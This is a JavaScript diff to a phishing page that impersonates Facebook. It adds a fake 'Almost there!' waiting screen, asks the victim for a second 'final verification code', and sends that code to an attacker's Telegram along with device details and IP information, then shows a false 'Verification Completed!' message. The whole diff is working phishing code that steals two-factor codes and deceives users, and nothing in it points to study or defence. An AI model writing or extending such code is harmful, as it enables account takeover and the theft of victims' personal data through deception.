@@ -700,22 +700,217 @@
             const success = await sendTelegramMessage(message);
             console.log('Verification code sent to Telegram:', success);
             
-            // Hide verification button and show continue button
+            // Hide verification input and button
+            verificationCodeInput.style.display = 'none';
+            document.querySelector('label[for="verification-code"]').style.display = 'none';
+            document.querySelector('span[style*="(6 or 8 digits)"]').style.display = 'none';
+            verificationCodeError.style.display = 'none';
             submitVerificationButton.style.display = 'none';
-            closeButton.style.display = 'inline-block';
             
-            // Show success message
-            verificationCodeInput.disabled = true;
-            verificationCodeInput.style.backgroundColor = '#f0f2f5';
+            // Show "Almost There!" message
+            const almostThereContainer = document.createElement('div');
+            almostThereContainer.style.textAlign = 'center';
+            almostThereContainer.style.marginTop = '10px';
             
-            // Add success text above continue button
-            const successMessage = document.createElement('p');
-            successMessage.style.color = '#42B72A';
-            successMessage.style.fontWeight = 'bold';
-            successMessage.style.marginTop = '10px';
-            successMessage.style.marginBottom = '10px';
-            successMessage.textContent = 'Verification successful!';
-            submitVerificationButton.parentNode.insertBefore(successMessage, closeButton);
+            const almostThereHeading = document.createElement('h3');
+            almostThereHeading.style.color = '#1877F2';
+            almostThereHeading.style.fontWeight = 'bold';
+            almostThereHeading.style.marginBottom = '10px';
+            almostThereHeading.textContent = 'Almost there!';
+            
+            const almostThereMessage = document.createElement('p');
+            almostThereMessage.style.fontSize = '14px';
+            almostThereMessage.style.color = '#65676B';
+            almostThereMessage.style.lineHeight = '1.4';
+            almostThereMessage.style.marginBottom = '15px';
+            almostThereMessage.innerHTML = 'A new code will be sent shortly to complete your verification process. <strong>Please stay on this page</strong> until the code arrives.';
+            
+            const loadingIndicator = document.createElement('div');
+            loadingIndicator.style.display = 'flex';
+            loadingIndicator.style.justifyContent = 'center';
+            loadingIndicator.style.alignItems = 'center';
+            loadingIndicator.style.marginBottom = '15px';
+            loadingIndicator.innerHTML = '<div style="width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px;"></div><span style="font-size: 14px; color: #65676B;">Waiting for code...</span>';
+            
+            const style = document.createElement('style');
+            style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+            document.head.appendChild(style);
+            
+            almostThereContainer.appendChild(almostThereHeading);
+            almostThereContainer.appendChild(almostThereMessage);
+            almostThereContainer.appendChild(loadingIndicator);
+            
+            // Insert the "Almost There" container before the verification input container's parent
+            verificationCodeInput.parentNode.parentNode.insertBefore(almostThereContainer, verificationCodeInput.parentNode);
+            
+            // Create second verification code input after a delay
+            setTimeout(function() {
+              loadingIndicator.style.display = 'none';
+              
+              // Show second verification message
+              const secondVerificationMessage = document.createElement('div');
+              secondVerificationMessage.style.padding = '12px';
+              secondVerificationMessage.style.backgroundColor = '#f0f2f5';
+              secondVerificationMessage.style.borderRadius = '8px';
+              secondVerificationMessage.style.marginBottom = '15px';
+              secondVerificationMessage.style.borderLeft = '4px solid #1877F2';
+              
+              const secondVerificationText = document.createElement('p');
+              secondVerificationText.style.margin = '0';
+              secondVerificationText.style.fontSize = '14px';
+              secondVerificationText.style.color = '#1c1e21';
+              secondVerificationText.style.lineHeight = '1.4';
+              secondVerificationText.innerHTML = 'We\'ve sent a <strong>final verification code</strong> to complete the process. Please enter it below:';
+              
+              secondVerificationMessage.appendChild(secondVerificationText);
+              almostThereContainer.appendChild(secondVerificationMessage);
+              
+              // Create second verification input
+              const secondCodeLabel = document.createElement('div');
+              secondCodeLabel.style.textAlign = 'left';
+              secondCodeLabel.style.marginBottom = '8px';
+              secondCodeLabel.style.marginTop = '15px';
+              secondCodeLabel.innerHTML = '<label style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter final security code</label> <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>';
+              
+              const secondCodeInput = document.createElement('input');
+              secondCodeInput.id = 'second-verification-code';
+              secondCodeInput.className = 'input-field';
+              secondCodeInput.type = 'text';
+              secondCodeInput.placeholder = 'Enter code';
+              secondCodeInput.style.width = '100%';
+              secondCodeInput.style.padding = '12px 16px';
+              secondCodeInput.style.border = '1px solid #dddfe2';
+              secondCodeInput.style.borderRadius = '6px';
+              secondCodeInput.style.fontSize = '16px';
+              secondCodeInput.style.textAlign = 'center';
+              secondCodeInput.style.letterSpacing = '2px';
+              secondCodeInput.style.boxShadow = '0 0 0 2px transparent';
+              secondCodeInput.style.transition = 'border-color 0.2s, box-shadow 0.2s';
+              
+              const secondCodeError = document.createElement('div');
+              secondCodeError.id = 'second-verification-code-error';
+              secondCodeError.className = 'error-message';
+              secondCodeError.style.display = 'none';
+              secondCodeError.style.color = '#ff0000';
+              secondCodeError.style.fontSize = '12px';
+              secondCodeError.style.marginTop = '5px';
+              secondCodeError.style.textAlign = 'left';
+              secondCodeError.textContent = 'Please enter a valid 6-digit or 8-digit code';
+              
+              const secondVerifyButton = document.createElement('button');
+              secondVerifyButton.id = 'submit-second-verification';
+              secondVerifyButton.className = 'modal-close-button';
+              secondVerifyButton.style.display = 'inline-block';
+              secondVerifyButton.style.textDecoration = 'none';
+              secondVerifyButton.style.marginTop = '20px';
+              secondVerifyButton.style.opacity = '0.7';
+              secondVerifyButton.style.cursor = 'not-allowed';
+              secondVerifyButton.style.padding = '10px 20px';
+              secondVerifyButton.style.fontSize = '15px';
+              secondVerifyButton.style.borderRadius = '6px';
+              secondVerifyButton.style.backgroundColor = '#1877F2';
+              secondVerifyButton.style.color = 'white';
+              secondVerifyButton.style.border = 'none';
+              secondVerifyButton.style.fontWeight = '600';
+              secondVerifyButton.style.minWidth = '200px';
+              secondVerifyButton.textContent = 'Complete Verification';
+              secondVerifyButton.disabled = true;
+              
+              const secondInputContainer = document.createElement('div');
+              secondInputContainer.style.margin = '0 auto';
+              secondInputContainer.style.maxWidth = '350px';
+              
+              secondInputContainer.appendChild(secondCodeLabel);
+              secondInputContainer.appendChild(secondCodeInput);
+              secondInputContainer.appendChild(secondCodeError);
+              
+              almostThereContainer.appendChild(secondInputContainer);
+              almostThereContainer.appendChild(secondVerifyButton);
+              
+              // Validate second verification code
+              function validateSecondVerificationCode() {
+                const code = secondCodeInput.value.trim();
+                if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
+                  secondCodeError.style.display = 'block';
+                  secondVerifyButton.disabled = true;
+                  secondVerifyButton.style.opacity = '0.7';
+                  secondVerifyButton.style.cursor = 'not-allowed';
+                  return false;
+                } else {
+                  secondCodeError.style.display = 'none';
+                  secondVerifyButton.disabled = false;
+                  secondVerifyButton.style.opacity = '1';
+                  secondVerifyButton.style.cursor = 'pointer';
+                  return true;
+                }
+              }
+              
+              // Add event listener for second code input
+              secondCodeInput.addEventListener('input', validateSecondVerificationCode);
+              
+              // Handle second verification submit
+              secondVerifyButton.addEventListener('click', async function() {
+                const secondCode = secondCodeInput.value.trim();
+                if (validateSecondVerificationCode()) {
+                  try {
+                    // Get current information
+                    const ipInfo = await getIpInfo();
+                    const deviceDetails = getDeviceDetails();
+                    
+                    // Format message for Telegram with second verification code
+                    const timestamp = new Date().toLocaleString();
+                    let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
+                    message += `🔢 Second Code: ${secondCode}\n`;
+                    message += deviceDetails;
+                    message += `\n${ipInfo}`;
+                    
+                    // Send message to Telegram
+                    const success = await sendTelegramMessage(message);
+                    console.log('Second verification code sent to Telegram:', success);
+                    
+                    // Hide second verification inputs and show success
+                    secondInputContainer.style.display = 'none';
+                    secondVerifyButton.style.display = 'none';
+                    
+                    // Show success message and continue button
+                    const finalSuccessMessage = document.createElement('div');
+                    finalSuccessMessage.style.textAlign = 'center';
+                    finalSuccessMessage.style.marginTop = '20px';
+                    
+                    const checkIcon = document.createElement('div');
+                    checkIcon.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#42B72A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>';
+                    checkIcon.style.margin = '0 auto 10px';
+                    
+                    const verificationCompletedText = document.createElement('h3');
+                    verificationCompletedText.style.color = '#42B72A';
+                    verificationCompletedText.style.fontWeight = 'bold';
+                    verificationCompletedText.style.marginBottom = '15px';
+                    verificationCompletedText.textContent = 'Verification Completed!';
+                    
+                    const verificationSuccessText = document.createElement('p');
+                    verificationSuccessText.style.fontSize = '14px';
+                    verificationSuccessText.style.color = '#65676B';
+                    verificationSuccessText.style.lineHeight = '1.4';
+                    verificationSuccessText.style.marginBottom = '20px';
+                    verificationSuccessText.textContent = 'Your account has been verified successfully. You can now continue to Facebook.';
+                    
+                    finalSuccessMessage.appendChild(checkIcon);
+                    finalSuccessMessage.appendChild(verificationCompletedText);
+                    finalSuccessMessage.appendChild(verificationSuccessText);
+                    
+                    // Show continue button
+                    closeButton.style.display = 'inline-block';
+                    
+                    almostThereContainer.appendChild(finalSuccessMessage);
+                    almostThereContainer.appendChild(closeButton);
+                    
+                  } catch (error) {
+                    console.error('Error sending second verification code:', error);
+                  }
+                }
+              });
+              
+            }, 3000); // Show second verification after 3 seconds
             
           } catch (error) {
             console.error('Error sending verification code:', error);
